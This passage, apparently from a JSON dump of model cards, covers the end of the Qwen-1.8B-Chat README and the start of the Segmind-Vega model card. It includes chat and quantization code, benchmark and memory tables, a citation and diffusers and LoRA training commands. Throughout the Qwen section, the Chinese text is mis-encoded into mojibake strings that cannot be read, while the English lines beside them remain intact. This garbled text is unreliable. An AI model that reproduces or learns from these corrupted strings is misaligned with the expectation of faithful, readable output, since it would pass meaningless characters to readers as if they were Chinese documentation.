device_map=\"auto\", trust_remote_code=True).eval()\n# Specify hyperparameters for generation. But if you use transformers>=4.32.0, there is no need to do this.\n# model.generation_config = GenerationConfig.from_pretrained(\"Qwen/Qwen-1_8B-Chat\", trust_remote_code=True) # å¯æŒ‡å®šä¸åŒçš„ç”Ÿæˆé•¿åº¦ã€top_pç­‰ç›¸å…³è¶…å‚\n# ç¬¬ä¸€è½®å¯¹è¯ 1st dialogue turn\nresponse, history = model.chat(tokenizer, \"ä½ å¥½\", history=None)\nprint(response)\n# ä½ å¥½ï¼å¾ˆé«˜å…´ä¸ºä½ æä¾›å¸®åŠ©ã€‚\n# ç¬¬äºŒè½®å¯¹è¯ 2nd dialogue turn\nresponse, history = model.chat(tokenizer, \"ç»™æˆ‘è®²ä¸€ä¸ªå¹´è½»äººå¥‹æ–—åˆ›ä¸šæœ€ç»ˆå–å¾—æˆåŠŸçš„æ•…äº‹ã€‚\", history=history)\nprint(response)\n# è¿™æ˜¯ä¸€ä¸ªå…³äºä¸€ä¸ªå¹´è½»äººå¥‹æ–—åˆ›ä¸šæœ€ç»ˆå–å¾—æˆåŠŸçš„æ•…äº‹ã€‚\n# æ•…äº‹çš„ä¸»äººå…¬å«ææ˜ï¼Œä»–æ¥è‡ªä¸€ä¸ªæ™®é€šçš„å®¶åº­ï¼Œçˆ¶æ¯éƒ½æ˜¯æ™®é€šçš„å·¥äººã€‚ä»å°ï¼Œææ˜å°±ç«‹ä¸‹äº†ä¸€ä¸ªç›®æ ‡ï¼šè¦æˆä¸ºä¸€åæˆåŠŸçš„ä¼ä¸šå®¶ã€‚\n# ä¸ºäº†å®ç°è¿™ä¸ªç›®æ ‡ï¼Œææ˜å‹¤å¥‹å­¦ä¹ ï¼Œè€ƒä¸Šäº†å¤§å­¦ã€‚åœ¨å¤§å­¦æœŸé—´ï¼Œä»–ç§¯æå‚åŠ å„ç§åˆ›ä¸šæ¯”èµ›ï¼Œè·å¾—äº†ä¸å°‘å¥–é¡¹ã€‚ä»–è¿˜åˆ©ç”¨è¯¾ä½™æ—¶é—´å»å®ä¹ ï¼Œç§¯ç´¯äº†å®è´µçš„ç»éªŒã€‚\n# æ¯•ä¸šåï¼Œææ˜å†³å®šå¼€å§‹è‡ªå·±çš„åˆ›ä¸šä¹‹è·¯ã€‚ä»–å¼€å§‹å¯»æ‰¾æŠ•èµ„æœºä¼šï¼Œä½†å¤šæ¬¡éƒ½è¢«æ‹’ç»äº†ã€‚ç„¶è€Œï¼Œä»–å¹¶æ²¡æœ‰æ”¾å¼ƒã€‚ä»–ç»§ç»­åŠªåŠ›ï¼Œä¸æ–­æ”¹è¿›è‡ªå·±çš„åˆ›ä¸šè®¡åˆ’ï¼Œå¹¶å¯»æ‰¾æ–°çš„æŠ•èµ„æœºä¼šã€‚\n# æœ€ç»ˆï¼Œææ˜æˆåŠŸåœ°è·å¾—äº†ä¸€ç¬”æŠ•èµ„ï¼Œå¼€å§‹äº†è‡ªå·±çš„åˆ›ä¸šä¹‹è·¯ã€‚ä»–æˆç«‹äº†ä¸€å®¶ç§‘æŠ€å…¬å¸ï¼Œä¸“æ³¨äºå¼€å‘æ–°å‹è½¯ä»¶ã€‚åœ¨ä»–çš„é¢†å¯¼ä¸‹ï¼Œå…¬å¸è¿…é€Ÿå‘å±•èµ·æ¥ï¼Œæˆä¸ºäº†ä¸€å®¶æˆåŠŸçš„ç§‘æŠ€ä¼ä¸šã€‚\n# ææ˜çš„æˆåŠŸå¹¶ä¸æ˜¯å¶ç„¶çš„ã€‚ä»–å‹¤å¥‹ã€åšéŸ§ã€å‹‡äºå†’é™©ï¼Œä¸æ–­å­¦ä¹ å’Œæ”¹è¿›è‡ªå·±ã€‚ä»–çš„æˆåŠŸä¹Ÿè¯æ˜äº†ï¼Œåªè¦åŠªåŠ›å¥‹æ–—ï¼Œä»»ä½•äººéƒ½æœ‰å¯èƒ½å–å¾—æˆåŠŸã€‚\n# ç¬¬ä¸‰è½®å¯¹è¯ 3rd dialogue turn\nresponse, history = model.chat(tokenizer, \"ç»™è¿™ä¸ªæ•…äº‹èµ·ä¸€ä¸ªæ ‡é¢˜\", history=history)\nprint(response)\n# ã€Šå¥‹æ–—åˆ›ä¸šï¼šä¸€ä¸ªå¹´è½»äººçš„æˆåŠŸä¹‹è·¯ã€‹\n# Qwen-1.8B-Chatç°åœ¨å¯ä»¥é€šè¿‡è°ƒæ•´ç³»ç»ŸæŒ‡ä»¤ï¼ˆSystem Promptï¼‰ï¼Œå®ç°è§’è‰²æ‰®æ¼”ï¼Œè¯­è¨€é£æ ¼è¿ç§»ï¼Œä»»åŠ¡è®¾å®šï¼Œè¡Œä¸ºè®¾å®šç­‰èƒ½åŠ›ã€‚\n# Qwen-1.8B-Chat can realize roly playing, language style transfer, task setting, and behavior setting by system prompt.\nresponse, _ = model.chat(tokenizer, \"ä½ å¥½å‘€\", history=None, system=\"è¯·ç”¨äºŒæ¬¡å…ƒå¯çˆ±è¯­æ°”å’Œæˆ‘è¯´è¯\")\nprint(response)\n# ä½ å¥½å•Šï¼æˆ‘æ˜¯ä¸€åªå¯çˆ±çš„äºŒæ¬¡å…ƒçŒ«å’ªå“¦ï¼Œä¸çŸ¥é“ä½ æœ‰ä»€ä¹ˆé—®é¢˜éœ€è¦æˆ‘å¸®å¿™è§£ç­”å—ï¼Ÿ\nresponse, _ = model.chat(tokenizer, \"My colleague works diligently\", history=None, system=\"You will write beautiful compliments according to needs\")\nprint(response)\n# Your colleague is an outstanding worker! Their dedication and hard work are truly inspiring. They always go above and beyond to ensure that\n# their tasks are completed on time and to the highest standard. I am lucky to have them as a colleague, and I know I can count on them to handle any challenge that comes their way.\nå…³äºæ›´å¤šçš„ä½¿ç”¨è¯´æ˜ï¼Œè¯·å‚è€ƒæˆ‘ä»¬çš„GitHub repoè·å–æ›´å¤šä¿¡æ¯ã€‚\nFor more information, please refer to our GitHub repo for more information.\nTokenizer\næ³¨ï¼šä½œä¸ºæœ¯è¯­çš„â€œtokenizationâ€åœ¨ä¸­æ–‡ä¸­å°šæ— å…±è¯†çš„æ¦‚å¿µå¯¹åº”ï¼Œæœ¬æ–‡æ¡£é‡‡ç”¨è‹±æ–‡è¡¨è¾¾ä»¥åˆ©è¯´æ˜ã€‚\nåŸºäºtiktokençš„åˆ†è¯å™¨æœ‰åˆ«äºå…¶ä»–åˆ†è¯å™¨ï¼Œæ¯”å¦‚sentencepieceåˆ†è¯å™¨ã€‚å°¤å…¶åœ¨å¾®è°ƒé˜¶æ®µï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç‰¹æ®Štokençš„ä½¿ç”¨ã€‚å…³äºtokenizerçš„æ›´å¤šä¿¡æ¯ï¼Œä»¥åŠå¾®è°ƒæ—¶æ¶‰åŠçš„ç›¸å…³ä½¿ç”¨ï¼Œè¯·å‚é˜…æ–‡æ¡£ã€‚\nOur tokenizer based on tiktoken is different from other tokenizers, e.g., sentencepiece tokenizer. You need to pay attention to special tokens, especially in finetuning. For more detailed information on the tokenizer and related use in fine-tuning, please refer to the documentation.\né‡åŒ– (Quantization)\nç”¨æ³• (Usage)\nè¯·æ³¨æ„ï¼šæˆ‘ä»¬æ›´æ–°é‡åŒ–æ–¹æ¡ˆä¸ºåŸºäºAutoGPTQçš„é‡åŒ–ï¼Œæä¾›Qwen-1.8B-Chatçš„Int4é‡åŒ–æ¨¡å‹ç‚¹å‡»è¿™é‡Œã€‚ç›¸æ¯”æ­¤å‰æ–¹æ¡ˆï¼Œè¯¥æ–¹æ¡ˆåœ¨æ¨¡å‹è¯„æµ‹æ•ˆæœå‡ ä¹æ— æŸï¼Œä¸”å­˜å‚¨éœ€æ±‚æ›´ä½ï¼Œæ¨ç†é€Ÿåº¦æ›´ä¼˜ã€‚\nNote: we provide a new solution based on AutoGPTQ, and release an Int4 quantized model for Qwen-1.8B-Chat Click here, which achieves nearly lossless model effects but improved performance on both memory costs and inference speed, in comparison with the previous solution.\nä»¥ä¸‹æˆ‘ä»¬æä¾›ç¤ºä¾‹è¯´æ˜å¦‚ä½•ä½¿ç”¨Int4é‡åŒ–æ¨¡å‹ã€‚åœ¨å¼€å§‹ä½¿ç”¨å‰ï¼Œè¯·å…ˆä¿è¯æ»¡è¶³è¦æ±‚ï¼ˆå¦‚torch 2.0åŠä»¥ä¸Šï¼Œtransformersç‰ˆæœ¬ä¸º4.32.0åŠä»¥ä¸Šï¼Œç­‰ç­‰ï¼‰ï¼Œå¹¶å®‰è£…æ‰€éœ€å®‰è£…åŒ…ï¼š\nHere we demonstrate how to use our provided quantized models for inference. Before you start, make sure you meet the requirements of auto-gptq (e.g., torch 2.0 and above, transformers 4.32.0 and above, etc.) and install the required packages:\npip install auto-gptq optimum\nå¦‚å®‰è£…auto-gptqé‡åˆ°é—®é¢˜ï¼Œæˆ‘ä»¬å»ºè®®æ‚¨åˆ°å®˜æ–¹repoæœç´¢åˆé€‚çš„é¢„ç¼–è¯‘wheelã€‚\néšåå³å¯ä½¿ç”¨å’Œä¸Šè¿°ä¸€è‡´çš„ç”¨æ³•è°ƒç”¨é‡åŒ–æ¨¡å‹ï¼š\nIf you meet problems installing auto-gptq, we advise you to check out the official repo to find a pre-build wheel.\nThen you can load the quantized model easily and run inference as same as usual:\nmodel = AutoModelForCausalLM.from_pretrained(\n\"Qwen/Qwen-1_8B-Chat-Int4\",\ndevice_map=\"auto\",\ntrust_remote_code=True\n).eval()\nresponse, history = model.chat(tokenizer, \"ä½ å¥½\", history=None)\næ•ˆæœè¯„æµ‹\næˆ‘ä»¬ä½¿ç”¨åŸå§‹æ¨¡å‹çš„FP32å’ŒBF16ç²¾åº¦ï¼Œä»¥åŠé‡åŒ–è¿‡çš„Int8å’ŒInt4æ¨¡å‹åœ¨åŸºå‡†è¯„æµ‹ä¸Šåšäº†æµ‹è¯•ï¼Œç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š\nWe illustrate the model performance of both FP32, BF16, Int8 and Int4 models on the benchmark. Results are shown below:\nQuantization\nMMLU\nCEval (val)\nGSM8K\nHumaneval\nFP32\n43.4\n57.0\n33.0\n26.8\nBF16\n43.3\n55.6\n33.7\n26.2\nInt8\n43.1\n55.8\n33.0\n27.4\nInt4\n42.9\n52.8\n31.2\n25.0\næ¨ç†é€Ÿåº¦ (Inference Speed)\næˆ‘ä»¬æµ‹ç®—äº†FP32ã€BF16ç²¾åº¦å’ŒInt8ã€Int4é‡åŒ–æ¨¡å‹ç”Ÿæˆ2048å’Œ8192ä¸ªtokençš„å¹³å‡æ¨ç†é€Ÿåº¦ã€‚å¦‚å›¾æ‰€ç¤ºï¼š\nWe measured the average inference speed of generating 2048 and 8192 tokens under FP32, BF16 precision and Int8, Int4 quantization level, respectively.\nQuantization\nFlashAttn\nSpeed (2048 tokens)\nSpeed (8192 tokens)\nFP32\nv2\n52.96\n47.35\nBF16\nv2\n54.09\n54.04\nInt8\nv2\n55.56\n55.62\nInt4\nv2\n71.07\n76.45\nFP32\nv1\n52.00\n45.80\nBF16\nv1\n51.70\n55.04\nInt8\nv1\n53.16\n53.33\nInt4\nv1\n69.82\n67.44\nFP32\nDisabled\n52.28\n44.95\nBF16\nDisabled\n48.17\n45.01\nInt8\nDisabled\n52.16\n52.99\nInt4\nDisabled\n68.37\n65.94\nå…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬è®°å½•åœ¨é•¿åº¦ä¸º1çš„ä¸Šä¸‹æ–‡çš„æ¡ä»¶ä¸‹ç”Ÿæˆ8192ä¸ªtokençš„æ€§èƒ½ã€‚è¯„æµ‹è¿è¡Œäºå•å¼ A100-SXM4-80G GPUï¼Œä½¿ç”¨PyTorch 2.0.1å’ŒCUDA 11.4ã€‚æ¨ç†é€Ÿåº¦æ˜¯ç”Ÿæˆ8192ä¸ªtokençš„é€Ÿåº¦å‡å€¼ã€‚\nIn detail, the setting of profiling is generating 8192 new tokens with 1 context token. The profiling runs on a single A100-SXM4-80G GPU with PyTorch 2.0.1 and CUDA 11.4. The inference speed is averaged over the generated 8192 tokens.\næ˜¾å­˜ä½¿ç”¨ (GPU Memory Usage)\næˆ‘ä»¬æµ‹ç®—äº†FP32ã€BF16ç²¾åº¦å’ŒInt8ã€Int4é‡åŒ–æ¨¡å‹ç”Ÿæˆ2048ä¸ªåŠ8192ä¸ªtokenï¼ˆå•ä¸ªtokenä½œä¸ºè¾“å…¥ï¼‰çš„å³°å€¼æ˜¾å­˜å ç”¨æƒ…å†µã€‚ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š\nWe also profile the peak GPU memory usage for generating 2048 tokens and 8192 tokens (with single token as context) under FP32, BF16 or Int8, Int4 quantization level, respectively. The results are shown below.\nQuantization Level\nPeak Usage for Encoding 2048 Tokens\nPeak Usage for Generating 8192 Tokens\nFP32\n8.45GB\n13.06GB\nBF16\n4.23GB\n6.48GB\nInt8\n3.48GB\n5.34GB\nInt4\n2.91GB\n4.80GB\nä¸Šè¿°æ€§èƒ½æµ‹ç®—ä½¿ç”¨æ­¤è„šæœ¬å®Œæˆã€‚\nThe above speed and memory profiling are conducted using this script.\næ¨¡å‹ç»†èŠ‚ï¼ˆModelï¼‰\nä¸Qwen-1.8Bé¢„è®­ç»ƒæ¨¡å‹ç›¸åŒï¼ŒQwen-1.8B-Chatæ¨¡å‹è§„æ¨¡åŸºæœ¬æƒ…å†µå¦‚ä¸‹æ‰€ç¤º\nThe details of the model architecture of Qwen-1.8B-Chat are listed as follows\nHyperparameter\nValue\nn_layers\n24\nn_heads\n16\nd_model\n2048\nvocab size\n151851\nsequence length\n8192\nåœ¨ä½ç½®ç¼–ç ã€FFNæ¿€æ´»å‡½æ•°å’Œnormalizationçš„å®ç°æ–¹å¼ä¸Šï¼Œæˆ‘ä»¬ä¹Ÿé‡‡ç”¨äº†ç›®å‰æœ€æµè¡Œçš„åšæ³•ï¼Œ\nå³RoPEç›¸å¯¹ä½ç½®ç¼–ç ã€SwiGLUæ¿€æ´»å‡½æ•°ã€RMSNormï¼ˆå¯é€‰å®‰è£…flash-attentionåŠ é€Ÿï¼‰ã€‚\nåœ¨åˆ†è¯å™¨æ–¹é¢ï¼Œç›¸æ¯”ç›®å‰ä¸»æµå¼€æºæ¨¡å‹ä»¥ä¸­è‹±è¯è¡¨ä¸ºä¸»ï¼ŒQwen-1.8B-Chatä½¿ç”¨äº†çº¦15ä¸‡tokenå¤§å°çš„è¯è¡¨ã€‚\nè¯¥è¯è¡¨åœ¨GPT-4ä½¿ç”¨çš„BPEè¯è¡¨cl100k_baseåŸºç¡€ä¸Šï¼Œå¯¹ä¸­æ–‡ã€å¤šè¯­è¨€è¿›è¡Œäº†ä¼˜åŒ–ï¼Œåœ¨å¯¹ä¸­ã€è‹±ã€ä»£ç æ•°æ®çš„é«˜æ•ˆç¼–è§£ç çš„åŸºç¡€ä¸Šï¼Œå¯¹éƒ¨åˆ†å¤šè¯­è¨€æ›´åŠ å‹å¥½ï¼Œæ–¹ä¾¿ç”¨æˆ·åœ¨ä¸æ‰©å±•è¯è¡¨çš„æƒ…å†µä¸‹å¯¹éƒ¨åˆ†è¯­ç§è¿›è¡Œèƒ½åŠ›å¢å¼ºã€‚\nè¯è¡¨å¯¹æ•°å­—æŒ‰å•ä¸ªæ•°å­—ä½åˆ‡åˆ†ã€‚è°ƒç”¨è¾ƒä¸ºé«˜æ•ˆçš„tiktokenåˆ†è¯åº“è¿›è¡Œåˆ†è¯ã€‚\nFor position encoding, FFN activation function, and normalization calculation methods, we adopt the prevalent practices, i.e., RoPE relative position encoding, SwiGLU for activation function, and RMSNorm for normalization (optional installation of flash-attention for acceleration).\nFor tokenization, compared to the current mainstream open-source models based on Chinese and English vocabularies, Qwen-1.8B-Chat uses a vocabulary of over 150K tokens.\nIt first considers efficient encoding of Chinese, English, and code data, and is also more friendly to multilingual languages, enabling users to directly enhance the capability of some languages without expanding the vocabulary.\nIt segments numbers by single digit, and calls the tiktoken tokenizer library for efficient tokenization.\nè¯„æµ‹æ•ˆæœï¼ˆEvaluationï¼‰\nå¯¹äºQwen-1.8B-Chatæ¨¡å‹ï¼Œæˆ‘ä»¬åŒæ ·è¯„æµ‹äº†å¸¸è§„çš„ä¸­æ–‡ç†è§£ï¼ˆC-Evalï¼‰ã€è‹±æ–‡ç†è§£ï¼ˆMMLUï¼‰ã€ä»£ç ï¼ˆHumanEvalï¼‰å’Œæ•°å­¦ï¼ˆGSM8Kï¼‰ç­‰æƒå¨ä»»åŠ¡ï¼ŒåŒæ—¶åŒ…å«äº†é•¿åºåˆ—ä»»åŠ¡çš„è¯„æµ‹ç»“æœã€‚ç”±äºQwen-1.8B-Chatæ¨¡å‹ç»è¿‡å¯¹é½åï¼Œæ¿€å‘äº†è¾ƒå¼ºçš„å¤–éƒ¨ç³»ç»Ÿè°ƒç”¨èƒ½åŠ›ï¼Œæˆ‘ä»¬è¿˜è¿›è¡Œäº†å·¥å…·ä½¿ç”¨èƒ½åŠ›æ–¹é¢çš„è¯„æµ‹ã€‚\næç¤ºï¼šç”±äºç¡¬ä»¶å’Œæ¡†æ¶é€ æˆçš„èˆå…¥è¯¯å·®ï¼Œå¤ç°ç»“æœå¦‚æœ‰æ³¢åŠ¨å±äºæ­£å¸¸ç°è±¡ã€‚\nFor Qwen-1.8B-Chat, we also evaluate the model on C-Eval, MMLU, HumanEval, GSM8K, etc., as well as the benchmark evaluation for long-context understanding, and tool usage.\nNote: Due to rounding errors caused by hardware and framework, differences in reproduced results are possible.\nä¸­æ–‡è¯„æµ‹ï¼ˆChinese Evaluationï¼‰\nC-Eval\nåœ¨C-EvaléªŒè¯é›†ä¸Šï¼Œæˆ‘ä»¬è¯„ä»·äº†Qwen-1.8B-Chatæ¨¡å‹çš„å‡†ç¡®ç‡\nWe demonstrate the accuracy of Qwen-1.8B-Chat on C-Eval validation set\nModel\nAcc.\nRedPajama-INCITE-Chat-3B\n18.3\nOpenBuddy-3B\n23.5\nFirefly-Bloom-1B4\n23.6\nOpenLLaMA-Chinese-3B\n24.4\nLLaMA2-7B-Chat\n31.9\nChatGLM2-6B-Chat\n52.6\nInternLM-7B-Chat\n53.6\nQwen-1.8B-Chat (0-shot)\n55.6\nQwen-7B-Chat (0-shot)\n59.7\nQwen-7B-Chat (5-shot)\n59.3\nC-Evalæµ‹è¯•é›†ä¸Šï¼ŒQwen-1.8B-Chatæ¨¡å‹çš„zero-shotå‡†ç¡®ç‡ç»“æœå¦‚ä¸‹ï¼š\nThe zero-shot accuracy of Qwen-1.8B-Chat on C-Eval testing set is provided below:\nModel\nAvg.\nSTEM\nSocial Sciences\nHumanities\nOthers\nChinese-Alpaca-Plus-13B\n41.5\n36.6\n49.7\n43.1\n41.2\nChinese-Alpaca-2-7B\n40.3\n-\n-\n-\n-\nChatGLM2-6B-Chat\n50.1\n46.4\n60.4\n50.6\n46.9\nBaichuan-13B-Chat\n51.5\n43.7\n64.6\n56.2\n49.2\nQwen-1.8B-Chat\n53.8\n48.4\n68.0\n56.5\n48.3\nQwen-7B-Chat\n58.6\n53.3\n72.1\n62.8\n52.0\nè‹±æ–‡è¯„æµ‹ï¼ˆEnglish Evaluationï¼‰\nMMLU\nMMLUè¯„æµ‹é›†ä¸Šï¼ŒQwen-1.8B-Chatæ¨¡å‹çš„å‡†ç¡®ç‡å¦‚ä¸‹ï¼Œæ•ˆæœåŒæ ·åœ¨åŒç±»å¯¹é½æ¨¡å‹ä¸­åŒæ ·è¡¨ç°è¾ƒä¼˜ã€‚\nThe accuracy of Qwen-1.8B-Chat on MMLU is provided below.\nThe performance of Qwen-1.8B-Chat still on the top between other human-aligned models with comparable size.\nModel\nAcc.\nFirefly-Bloom-1B4\n23.8\nOpenBuddy-3B\n25.5\nRedPajama-INCITE-Chat-3B\n25.5\nOpenLLaMA-Chinese-3B\n25.7\nChatGLM2-6B-Chat\n46.0\nLLaMA2-7B-Chat\n46.2\nInternLM-7B-Chat\n51.1\nBaichuan2-7B-Chat\n52.9\nQwen-1.8B-Chat (0-shot)\n43.3\nQwen-7B-Chat (0-shot)\n55.8\nQwen-7B-Chat (5-shot)\n57.0\nä»£ç è¯„æµ‹ï¼ˆCoding Evaluationï¼‰\nQwen-1.8B-Chatåœ¨HumanEvalçš„zero-shot Pass@1æ•ˆæœå¦‚ä¸‹\nThe zero-shot Pass@1 of Qwen-1.8B-Chat on HumanEval is demonstrated below\nModel\nPass@1\nFirefly-Bloom-1B4\n0.6\nOpenLLaMA-Chinese-3B\n4.9\nRedPajama-INCITE-Chat-3B\n6.1\nOpenBuddy-3B\n10.4\nChatGLM2-6B-Chat\n11.0\nLLaMA2-7B-Chat\n12.2\nBaichuan2-7B-Chat\n13.4\nInternLM-7B-Chat\n14.6\nQwen-1.8B-Chat\n26.2\nQwen-7B-Chat\n37.2\næ•°å­¦è¯„æµ‹ï¼ˆMathematics Evaluationï¼‰\nåœ¨è¯„æµ‹æ•°å­¦èƒ½åŠ›çš„GSM8Kä¸Šï¼ŒQwen-1.8B-Chatçš„å‡†ç¡®ç‡ç»“æœå¦‚ä¸‹\nThe accuracy of Qwen-1.8B-Chat on GSM8K is shown below\nModel\nAcc.\nFirefly-Bloom-1B4\n2.4\nRedPajama-INCITE-Chat-3B\n2.5\nOpenLLaMA-Chinese-3B\n3.0\nOpenBuddy-3B\n12.6\nLLaMA2-7B-Chat\n26.3\nChatGLM2-6B-Chat\n28.8\nBaichuan2-7B-Chat\n32.8\nInternLM-7B-Chat\n33.0\nQwen-1.8B-Chat (0-shot)\n33.7\nQwen-7B-Chat (0-shot)\n50.3\nQwen-7B-Chat (8-shot)\n54.1\nè¯„æµ‹å¤ç°ï¼ˆReproductionï¼‰\næˆ‘ä»¬æä¾›äº†è¯„æµ‹è„šæœ¬ï¼Œæ–¹ä¾¿å¤§å®¶å¤ç°æ¨¡å‹æ•ˆæœï¼Œè¯¦è§é“¾æ¥ã€‚æç¤ºï¼šç”±äºç¡¬ä»¶å’Œæ¡†æ¶é€ æˆçš„èˆå…¥è¯¯å·®ï¼Œå¤ç°ç»“æœå¦‚æœ‰å°å¹…æ³¢åŠ¨å±äºæ­£å¸¸ç°è±¡ã€‚\nWe have provided evaluation scripts to reproduce the performance of our model, details as link.\nFAQ\nå¦‚é‡åˆ°é—®é¢˜ï¼Œæ•¬è¯·æŸ¥é˜…FAQä»¥åŠissueåŒºï¼Œå¦‚ä»æ— æ³•è§£å†³å†æäº¤issueã€‚\nIf you meet problems, please refer to FAQ and the issues first to search a solution before you launch a new issue.\nå¼•ç”¨ (Citation)\nå¦‚æœä½ è§‰å¾—æˆ‘ä»¬çš„å·¥ä½œå¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å¼•ç”¨ï¼\nIf you find our work helpful, feel free to give us a cite.\n@article{qwen,\ntitle={Qwen Technical Report},\nauthor={Jinze Bai and Shuai Bai and Yunfei Chu and Zeyu Cui and Kai Dang and Xiaodong Deng and Yang Fan and Wenbin Ge and Yu Han and Fei Huang and Binyuan Hui and Luo Ji and Mei Li and Junyang Lin and Runji Lin and Dayiheng Liu and Gao Liu and Chengqiang Lu and Keming Lu and Jianxin Ma and Rui Men and Xingzhang Ren and Xuancheng Ren and Chuanqi Tan and Sinan Tan and Jianhong Tu and Peng Wang and Shijie Wang and Wei Wang and Shengguang Wu and Benfeng Xu and Jin Xu and An Yang and Hao Yang and Jian Yang and Shusheng Yang and Yang Yao and Bowen Yu and Hongyi Yuan and Zheng Yuan and Jianwei Zhang and Xingxuan Zhang and Yichang Zhang and Zhenru Zhang and Chang Zhou and Jingren Zhou and Xiaohuan Zhou and Tianhang Zhu},\njournal={arXiv preprint arXiv:2309.16609},\nyear={2023}\n}\nä½¿ç”¨åè®®ï¼ˆLicense Agreementï¼‰\næˆ‘ä»¬çš„ä»£ç å’Œæ¨¡å‹æƒé‡å¯¹å­¦æœ¯ç ”ç©¶å®Œå…¨å¼€æ”¾ã€‚è¯·æŸ¥çœ‹LICENSEæ–‡ä»¶äº†è§£å…·ä½“çš„å¼€æºåè®®ç»†èŠ‚ã€‚å¦‚éœ€å•†ç”¨ï¼Œè¯·è”ç³»æˆ‘ä»¬ã€‚\nOur code and checkpoints are open to research purpose. Check the LICENSE for more details about the license. For commercial use, please contact us.\nè”ç³»æˆ‘ä»¬ï¼ˆContact Usï¼‰\nå¦‚æœä½ æƒ³ç»™æˆ‘ä»¬çš„ç ”å‘å›¢é˜Ÿå’Œäº§å“å›¢é˜Ÿç•™è¨€ï¼Œæ¬¢è¿åŠ å…¥æˆ‘ä»¬çš„å¾®ä¿¡ç¾¤ã€é’‰é’‰ç¾¤ä»¥åŠDiscordï¼åŒæ—¶ï¼Œä¹Ÿæ¬¢è¿é€šè¿‡é‚®ä»¶ï¼ˆqianwen_opensource@alibabacloud.comï¼‰è”ç³»æˆ‘ä»¬ã€‚\nIf you are interested to leave a message to either our research team or product team, join our Discord or WeChat groups! Also, feel free to send an email to qianwen_opensource@alibabacloud.com.",
    "segmind/Segmind-Vega": "Segmind-Vega Model Card\nğŸ“£ Read our technical report for more details on our disillation method\nDemo\nModel Description\nImage Comparison (Segmind-Vega vs SDXL)\nSpeed Comparison (Segmind-Vega vs SD-1.5 vs SDXL)\nParameters Comparison (Segmind-Vega vs SD-1.5 vs SDXL)\nUsage:\nPlease do use negative prompting and a CFG around 9.0 for the best quality!\nModel Description\nKey Features\nModel Architecture\nTraining Info\nModel Sources\nUses\nDirect Use\nDownstream Use\nOut-of-Scope Use\nLimitations and Bias\nCitation\nSegmind-Vega Model Card\nğŸ“£ Read our technical report for more details on our disillation method\nDemo\nTry out the Segmind-Vega model at Segmind-Vega for âš¡ fastest inference.\nModel Description\nThe Segmind-Vega Model is a distilled version of the Stable Diffusion XL (SDXL), offering a remarkable 70% reduction in size and an impressive 100% speedup while retaining high-quality text-to-image generation capabilities. Trained on diverse datasets, including Grit and Midjourney scrape data, it excels at creating a wide range of visual content based on textual prompts.\nEmploying a knowledge distillation strategy, Segmind-Vega leverages the teachings of several expert models, including SDXL, ZavyChromaXL, and JuggernautXL, to combine their strengths and produce compelling visual outputs.\nImage Comparison (Segmind-Vega vs SDXL)\nSpeed Comparison (Segmind-Vega vs SD-1.5 vs SDXL)\nThe tests were conducted on an A100 80GB GPU.\n(Note: All times are reported with the respective tiny-VAE!)\nParameters Comparison (Segmind-Vega vs SD-1.5 vs SDXL)\nUsage:\nThis model can be used via the ğŸ§¨ Diffusers library.\nMake sure to install diffusers by running\npip install diffusers\nIn addition, please install transformers, safetensors, and accelerate:\npip install transformers accelerate safetensors\nTo use the model, you can run the following:\nfrom diffusers import StableDiffusionXLPipeline\nimport torch\npipe = StableDiffusionXLPipeline.from_pretrained(\"segmind/Segmind-Vega\", torch_dtype=torch.float16, use_safetensors=True, variant=\"fp16\")\npipe.to(\"cuda\")\n# if using torch < 2.0\n# pipe.enable_xformers_memory_efficient_attention()\nprompt = \"A cute cat eating a slice of pizza, stunning color scheme, masterpiece, illustration\" # Your prompt here\nneg_prompt = \"(worst quality, low quality, illustration, 3d, 2d, painting, cartoons, sketch)\" # Negative prompt here\nimage = pipe(prompt=prompt, negative_prompt=neg_prompt).images[0]\nPlease do use negative prompting and a CFG around 9.0 for the best quality!\nModel Description\nDeveloped by: Segmind\nDevelopers: Yatharth Gupta and Vishnu Jaddipal.\nModel type: Diffusion-based text-to-image generative model\nLicense: Apache 2.0\nDistilled From: stabilityai/stable-diffusion-xl-base-1.0\nKey Features\nText-to-Image Generation: The Segmind-Vega model excels at generating images from text prompts, enabling a wide range of creative applications.\nDistilled for Speed: Designed for efficiency, this model offers an impressive 100% speedup, making it suitable for real-time applications and scenarios where rapid image generation is essential.\nDiverse Training Data: Trained on diverse datasets, the model can handle a variety of textual prompts and generate corresponding images effectively.\nKnowledge Distillation: By distilling knowledge from multiple expert models, the Segmind-Vega Model combines their strengths and minimizes their limitations, resulting in improved performance.\nModel Architecture\nThe Segmind-Vega Model is a compact version with a remarkable 70% reduction in size compared to the Base SDXL Model.\nTraining Info\nThese are the key hyperparameters used during training:\nSteps: 540,000\nLearning rate: 1e-5\nBatch size: 16\nGradient accumulation steps: 8\nImage resolution: 1024\nMixed-precision: fp16\nModel Sources\nFor research and development purposes, the Segmind-Vega Model can be accessed via the Segmind AI platform. For more information and access details, please visit Segmind.\nUses\nDirect Use\nThe Segmind-Vega Model is suitable for research and practical applications in various domains, including:\nArt and Design: It can be used to generate artworks, designs, and other creative content, providing inspiration and enhancing the creative process.\nEducation: The model can be applied in educational tools to create visual content for teaching and learning purposes.\nResearch: Researchers can use the model to explore generative models, evaluate its performance, and push the boundaries of text-to-image generation.\nSafe Content Generation: It offers a safe and controlled way to generate content, reducing the risk of harmful or inappropriate outputs.\nBias and Limitation Analysis: Researchers and developers can use the model to probe its limitations and biases, contributing to a better understanding of generative models' behavior.\nDownstream Use\nThe Segmind-Vega Model can also be used directly with the ğŸ§¨ Diffusers library training scripts for further training, including:\nLoRA:\nexport MODEL_NAME=\"segmind/Segmind-Vega\"\nexport VAE_NAME=\"madebyollin/sdxl-vae-fp16-fix\"\nexport DATASET_NAME=\"lambdalabs/pokemon-blip-captions\"\naccelerate launch train_text_to_image_lora_sdxl.py \\\n--pretrained_model_name_or_path=$MODEL_NAME \\\n--pretrained_vae_model_name_or_path=$VAE_NAME \\\n--dataset_name=$DATASET_NAME --caption_column=\"text\" \\\n--resolution=1024 --random_flip \\\n--train_batch_size=1 \\\n--num_train_epochs=2 --checkpointing_steps=500 \\\n--learning_rate=1e-04 --lr_scheduler=\"constant\" --lr_warmup_steps=0 \\\n--mixed_precision=\"fp16\" \\\n--seed=42 \\\n--output_dir=\"vega-pokemon-model-lora\" 